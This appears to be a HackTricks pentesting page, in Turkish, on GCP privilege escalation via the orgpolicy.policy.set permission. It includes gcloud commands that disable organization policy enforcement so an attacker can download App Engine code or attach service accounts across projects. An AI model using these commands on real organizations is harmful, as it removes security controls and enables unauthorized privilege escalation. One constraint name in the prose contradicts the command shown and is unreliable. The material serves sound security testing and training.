# GCP - Orgpolicy Privesc

{{#include ../../../banners/hacktricks-training.md}}

## orgpolicy

### `orgpolicy.policy.set`

Bir saldırgan **orgpolicy.policy.set** yetkisini kullanarak organizasyon politikalarını manipüle edebilir; bu da belirli işlemleri engelleyen bazı kısıtlamaları kaldırmasına olanak tanır. Örneğin, **appengine.disableCodeDownload** kısıtlaması genellikle App Engine kaynak kodunun indirilmesini engeller. Ancak **orgpolicy.policy.set** kullanılarak saldırgan bu kısıtlamayı devre dışı bırakabilir ve böylece başlangıçta korunuyor olsa bile kaynak kodunu indirme erişimi elde edebilir.

<details>
<summary>Org policy bilgilerini al ve zorlamayı devre dışı bırak</summary>
```bash
# Get info
gcloud resource-manager org-policies describe <org-policy> [--folder <id> | --organization <id> | --project <id>]

# Disable
gcloud resource-manager org-policies disable-enforce <org-policy> [--folder <id> | --organization <id> | --project <id>]
```
</details>

Bu yöntem için bir python scripti [burada](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/orgpolicy.policy.set.py) bulunabilir.

### `orgpolicy.policy.set`, `iam.serviceAccounts.actAs`

Genellikle farklı bir projeye ait bir service account'u bir kaynağa eklemek mümkün değildir çünkü bu işlemi engelleyen **`iam.disableCrossProjectServiceAccountUsage`** adlı bir kısıtlama uygulanır.

Bu kısıtlamanın uygulanıp uygulanmadığını aşağıdaki komutu çalıştırarak doğrulayabilirsiniz:

<details>
<summary>Projeler arası service account kısıtlamasını doğrulayın</summary>
```bash
gcloud resource-manager org-policies describe \
constraints/iam.disableCrossProjectServiceAccountUsage \
--project=<project-id> \
--effective

booleanPolicy:
enforced: true
constraint: constraints/iam.disableCrossProjectServiceAccountUsage
```
</details>

Bu, bir attacker'ın **`iam.serviceAccounts.actAs`** iznini kötüye kullanarak —örneğin yeni bir VM başlatmak için gereken ek altyapı izinlerine sahip olmadan— başka bir projeden bir service account'u taklit etmesini engeller; bu durum privilege escalation ile sonuçlanabilir.

Ancak **`orgpolicy.policy.set`** izinlerine sahip bir attacker, **`iam.disableServiceAccountProjectWideAccess`** kısıtlamasını devre dışı bırakarak bu sınırlamayı aşabilir. Bu, attacker'ın başka bir projeden bir service account'u kendi projesindeki bir resource'a eklemesine izin verir ve böylece ayrıcalıklarını etkili bir şekilde yükseltir.

<details>
<summary>Projeler arası service account kısıtlamasını devre dışı bırak</summary>
```bash
gcloud resource-manager org-policies disable-enforce \
iam.disableCrossProjectServiceAccountUsage \
--project=<project-id>
```
</details>

## Kaynaklar

- [https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/](https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/)

{{#include ../../../banners/hacktricks-training.md}}
